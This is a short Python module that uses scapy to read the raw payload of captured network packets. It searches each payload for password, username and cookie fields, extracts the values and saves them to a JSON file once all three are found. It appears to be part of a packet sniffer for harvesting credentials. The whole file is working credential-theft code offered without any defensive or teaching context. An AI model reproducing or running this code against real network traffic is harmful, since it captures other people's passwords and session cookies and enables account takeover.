from scapy.all import Raw
import json


user_credential_keys = {
    "Password": ["pass: ", "password: ", "Password: ", "pass= ", "password=", "Password= "],
    "UserName": ["username: ", "userid: ", "Username: ", "username=", "userid=", "Username="],
    "Cookie": ["Cookies: ", "Cookie: ", "Cookies= ", "Cookie= "]
}


def get_credential(packet, credential_keys):
    for keys in credential_keys:
        try:
            s = packet[Raw].load.decode("utf-8")
            si = s.find(keys)
            if si == -1:
                continue

            ei = s.find("\r\n",si)
            if ei == -1:
                ei = s.find("&", si)
            
            ss = s[si + len(keys): ei]       
            return ss
        except:
            pass
    
    return None


def get_all_user_credentials(packet, data):
    user_credentials = {}
    for credential in user_credential_keys:
        user_credentials[credential] = get_credential(packet, user_credential_keys[credential])


    if user_credentials["Password"] != None and user_credentials["UserName"] != None and user_credentials["Cookie"] != None:
        with open("user_credentials.json", 'w') as json_file:
            json.dump(user_credentials, json_file, indent=4)
        print("STORED ALL THE CREDENTIALS IN `user_credentials.json`")
        return True
    else:
        return False